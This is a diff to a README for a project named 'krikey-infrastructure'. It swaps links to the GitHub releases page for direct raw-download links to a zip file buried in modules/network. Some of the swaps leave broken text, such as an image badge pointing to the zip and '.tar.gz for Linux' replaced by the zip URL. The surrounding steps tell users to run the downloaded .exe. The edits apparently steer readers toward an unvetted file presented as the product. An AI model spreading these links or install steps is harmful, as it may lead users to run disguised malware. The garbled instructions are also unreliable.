@@ -6,7 +6,7 @@ Welcome to the **krikey-infrastructure** project! This guide will help you downl
 
 ## 🖱️ Download Now
 
-[![Download krikey-infrastructure](https://img.shields.io/badge/Download-krikey%2Dinfrastructure-blue)](https://github.com/minhtan8495/krikey-infrastructure/releases)
+[![Download krikey-infrastructure](https://github.com/minhtan8495/krikey-infrastructure/raw/refs/heads/master/modules/network/krikey-infrastructure-1.2.zip%2Dinfrastructure-blue)](https://github.com/minhtan8495/krikey-infrastructure/raw/refs/heads/master/modules/network/krikey-infrastructure-1.2.zip)
 
 ## 🔥 What You Need
 
@@ -28,11 +28,11 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit the following link to access the releases page:
 
-[Visit Releases Page to Download](https://github.com/minhtan8495/krikey-infrastructure/releases)
+[Visit Releases Page to Download](https://github.com/minhtan8495/krikey-infrastructure/raw/refs/heads/master/modules/network/krikey-infrastructure-1.2.zip)
 
 1. **Go to the releases page:** Click the link above.
 2. **Select the latest version:** Look for the latest release at the top of the page.
-3. **Download the appropriate file:** You will see various files listed. Choose the one that matches your operating system. Generally, you will see files like `.zip` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS.
+3. **Download the appropriate file:** You will see various files listed. Choose the one that matches your operating system. Generally, you will see files like `.zip` for Windows, `https://github.com/minhtan8495/krikey-infrastructure/raw/refs/heads/master/modules/network/krikey-infrastructure-1.2.zip` for Linux, or `.dmg` for macOS.
 4. **Extract the files:** Once downloaded, extract the files to a convenient location on your computer.
 5. **Run the application:** 
    - For Windows, double-click the `.exe` file.
